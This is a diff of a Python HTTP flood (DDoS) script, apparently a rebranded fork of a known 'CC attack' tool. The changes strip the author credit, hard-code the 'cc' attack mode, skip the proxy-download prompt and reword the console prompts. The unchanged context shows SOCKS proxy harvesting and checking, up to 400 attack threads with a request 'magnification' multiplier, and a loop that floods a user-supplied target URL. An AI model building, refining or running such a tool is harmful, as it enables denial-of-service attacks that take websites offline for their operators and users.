@@ -1,9 +1,3 @@
-#!/usr/bin/python3
-#Coded by L330n123
-#########################################
-#         Just a little change          #
-#                           -- L330n123 #
-#########################################
 import requests
 import socket
 import socks
@@ -187,20 +181,20 @@ def InputOption(question,options,default):
 		if ans == "":
 			ans = default
 		elif ans not in options:
-			print("> Please enter the correct option")
+			print("	[+] Please enter the correct option")
 			ans = ""
 			continue
 	return ans
 
 def CheckerOption():
 	global proxies
-	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+	N = "n"
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+		out_file = str(input("	[+]  Socks4 Proxy file path(socks4.txt):"))
 		if out_file == '':
 			out_file = str("socks4.txt")
 		else:
@@ -208,7 +202,7 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+		out_file = str(input("	[+]  Socks5 Proxy file path(socks5.txt):"))
 		if out_file == '':
 			out_file = str("socks5.txt")
 		else:
@@ -216,15 +210,15 @@ def CheckerOption():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	if len(proxies) == 0:
-		print("> There are no more proxies. Please download a new one.")
+		print("	[+]  There are no more proxies. Please download a new one.")
 		sys.exit(1)
-	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+	print ("	[+]  Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+	ans = str(input("	[+]  Do u need to check the socks list?(y/n, defualt=y):"))
 	if ans == "":
 		ans = "y"
 	if ans == "y":
-		ms = str(input("> Delay of socks(seconds, default=5):"))
+		ms = str(input("	[+]  Delay of socks(seconds, default=5):"))
 		if ms == "":
 			ms = int(5)
 		else :
@@ -246,9 +240,7 @@ def OutputToScreen(ind_rlock):
 	while 1:
 		if i > 3:
 			i = 0
-		print("{:^70}".format("Proxies attacking status"))
-		print("{:^70}".format("IP:PORT   <->   RPS    "))
-		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
+		print(format("	[+]  Attack  [+]  "))
 		ind_rlock.acquire()
 		top_num = 0
 		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
@@ -263,16 +255,13 @@ def OutputToScreen(ind_rlock):
 				top = top10[num]
 				rps = ind_dict[top]
 				ind_dict[top] = 0
-			print("{:^70}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
 		total = 0
 		for k,v in ind_dict.items():
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
 		i+=1
 		time.sleep(1)
-		print("\n"*100)
 
 def cc(event,socks_type,ind_rlock):
 	global ind_dict
@@ -509,30 +498,30 @@ def check_socks(ms):#Coded by Leeon123
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("	[+] Checked "+str(nums)+" socks\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("	[+] Checked "+str(nums)+" socks\r")
 		sys.stdout.flush()
-	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
-	ans = input("> Do u want to save them in a file? (y/n, default=y)")
+	print("\r\n	[+] Checked all socks, Total live:"+str(len(proxies)))
+	ans = input("	[+] Do u want to save them in a file? (y/n, default=y)")
 	if ans == "y" or ans == "":
 		if choice == "4":
 			with open("socks4.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("> They are saved in socks4.txt.")
+			print("	[+] They are saved in socks4.txt.")
 		elif choice == "5":
 			with open("socks5.txt", 'wb') as fp:
 				for lines in list(proxies):
 					fp.write(bytes(lines,encoding='utf8'))
 			fp.close()
-			print("> They are saved in socks5.txt.")
+			print("	[+] They are saved in socks5.txt.")
 			
 def check_list(socks_file):
-	print("> Checking list")
+	print("	[+] Checking list socks")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -586,7 +575,7 @@ def downloadsocks(choice):
 				out_file.close()
 		except:
 			pass
-		print("> Have already downloaded socks4 list as socks4.txt")
+		print("	[+] Have already downloaded socks4 list as socks4.txt")
 	if choice == "5":
 		f = open("socks5.txt",'wb')
 		try:
@@ -615,10 +604,10 @@ def downloadsocks(choice):
 			f.close()
 		except:
 			f.close()
-		print("> Have already downloaded socks5 list as socks5.txt")
+		print("	[+] Have already downloaded socks5 list as socks5.txt")
 def prevent():
 	if '.gov' in url :
-		print("> You can't attack .gov website!")
+		print("	[+] You can't attack .gov website!")
 		exit()
 	
 def main():
@@ -629,32 +618,31 @@ def main():
 	global cookies
 	global brute
 	global url
-	print("> Mode: [cc/post/head/slow/check]")
-	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Target url:")).strip()
+	mode = "cc"
+	url = str(input("	[+] URL:")).strip()
 	prevent()
 	ParseUrl(url)
 	if mode == "post":
-		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		mode2 = InputOption("	[+] Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
 		if mode2 == "y":
 			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	choice2 = InputOption("	[+] Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
 	if choice2 == "y":
 		cookies = str(input("Plese input the cookies:")).strip()
-	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
+	choice = InputOption("	[+] Choose your socks mode(4/5, default=5):",["4","5"],"5")
 	if choice == "4":
 		socks_type = 4
 	else:
 		socks_type = 5
 	if mode == "check":
 		CheckerOption()
-		print("> End of process")
+		print("	[+] End of process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Connections(default=400):"))
+		thread_num = str(input("	[+] Connections(default=400):"))
 	else:
-		thread_num = str(input("> Threads(default=400):"))
+		thread_num = str(input("	[+] Threads(default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -664,21 +652,21 @@ def main():
 			sys.exit("Error thread number")
 	CheckerOption()
 	if len(proxies) == 0:
-		print("> There are no more proxies. Please download a new one.")
+		print("	[+] There are no more proxies. Please download a new one.")
 		return
 	ind_rlock = threading.RLock()
 	if mode == "slow":
-		input("Press Enter to continue.")
+		input("	[+] Press Enter to continue.")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
 		th.setDaemon(True)
 		th.start()
 	else:
-		multiple = str(input("> Input the Magnification(default=100):"))
+		multiple = str(input("	[+] Input the Magnification(default=100):"))
 		if multiple == "":
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
+		brute = str(input("	[+] Enable boost mode[beta](y/n, default=n):"))
 		if brute == "":
 			brute = False
 		elif brute == "y":
@@ -686,11 +674,11 @@ def main():
 		elif brute == "n":
 			brute = False
 		event = threading.Event()
-		print("> Building threads...")
+		print("	[+] Building threads...")
 		SetupIndDict()
 		build_threads(mode,thread_num,event,socks_type,ind_rlock)
 		event.clear()
-		input("Press Enter to continue.")
+		input("	[+] Press Enter to continue.")
 		event.set()
 		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
@@ -701,4 +689,4 @@ def main():
 	
 
 if __name__ == "__main__":
-	main()#Coded by Leeon123
+	main()
